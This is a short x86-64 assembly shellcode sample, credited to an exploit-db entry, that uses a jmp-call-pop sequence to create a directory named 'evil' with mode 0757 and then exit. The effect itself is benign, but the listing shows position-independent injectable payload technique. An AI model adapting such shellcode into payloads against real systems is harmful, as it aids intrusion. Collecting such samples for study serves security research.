;; https://www.exploit-db.com/exploits/42791/

section .text
        global _start
_start:
        jmp folder
main:
        xor rax,rax
        pop rdi
        mov si,0x1ef ;<--- Set Permission
        add al,83
        syscall
 
        xor rax,rax
        add al,60
        syscall
folder:
        call main
        fname db "evil" 
